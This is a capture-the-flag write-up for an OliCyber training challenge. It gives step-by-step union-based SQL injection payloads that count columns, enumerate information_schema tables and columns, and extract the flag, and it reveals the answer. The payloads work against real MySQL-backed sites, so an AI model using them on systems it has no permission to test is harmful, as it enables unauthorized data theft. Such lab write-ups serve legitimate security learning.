# URL
https://training.olicyber.it/challenges#challenge-357

# Concept
Performing Union Based SQL injection 

# Method of Solve
- Go to the Challenge Interface
- Navigate to the Target URL and follow the instructions to perform an UNION based SQL Injection
- First lets find how many tables columns are there in the databases
  ```
    ' ORDER BY 1#
    ' ORDER BY 2#
    ' ORDER BY 3#
    ' ORDER BY 4# 
    .
    .
    .
    ' ORDER BY 7# ---> This gives error
  ```
- This means that there are 6 Columns in the Database
- Now next lets find how many of them are injectible i.e. contains strings
  ```
    ' UNION SELECT 'col1','col2','col3','col4','col5','col6'#
  ```
- Then Lets find the names of the all tables in database
  ```
    ' UNION SELECT table_name,NULL,NULL,NULL,NULL,NULL FROM information_schema.tables WHERE table_schema=database()#
  ```
- Then lets find names of columns in the tables to set a table as target
  ```
    ' UNION SELECT CONCAT(table_name, ': ', GROUP_CONCAT(column_name)),'','','','','' FROM information_schema.columns WHERE table_schema=database() GROUP BY table_name#
  ```
- This gives output
  ```
    real_data: id,flag, , , , , 
    dummy_data: id,dummy_column,dummy_int,another_column,foobar,idk_what_im_doing, , , , ,
  ```
- This gives us the information about the table to be used is **real_data**
- Now lets get data types for the real_data columns
  ```
    ' UNION SELECT CONCAT(column_name, ' (', data_type, ')'),'','','','','' FROM information_schema.columns WHERE table_name='real_data' AND table_schema=database()#
  ```
- This gives output
  ```
    flag (text), , , , , 
    id (you), , , , ,
  ```
- This tells us that flag has data type text or string
- Now lets get flag or retrieve flag data is present any
  ```
    ' UNION SELECT flag,'','','','','' FROM real_data#
  ```
- The Output is :
  ```
    flag{Uni0ns_4re_so_tr1vi4l}, , , , ,
  ```
- So The Flag is **flag{Uni0ns_4re_so_tr1vi4l}**
